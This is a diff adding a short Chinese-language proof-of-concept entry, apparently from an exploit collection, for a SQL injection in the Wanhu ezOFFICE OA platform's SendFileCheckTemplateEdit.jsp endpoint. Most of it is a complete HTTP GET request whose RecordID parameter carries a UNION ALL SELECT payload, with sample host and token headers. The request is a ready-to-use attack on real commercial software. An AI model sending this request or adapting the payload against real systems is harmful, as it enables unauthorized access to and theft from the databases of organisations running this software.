@@ -1,0 +1,9 @@
+# 万户OA SendFileCheckTemplateEdit SQL注入漏洞
+# 万户ezOFFICE协同管理平台是一个综合信息基础应用平台。万户OA SendFileCheckTemplateEdit 存在SQL注入漏洞，攻击者通过漏洞获取数据库敏感信息。
+GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1%27%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27admin%27)),NULL,NULL,NULL,NULL,NULL--&acid=80051433&bid=hd_tag_m8mv23pi HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23pi
+RM-PRO-Token: ebc79ab61b3d0e345af60017d9bf353a
+RM-PRO-Time: 1742808334827
+User-Agent: curl/7.83.1
+
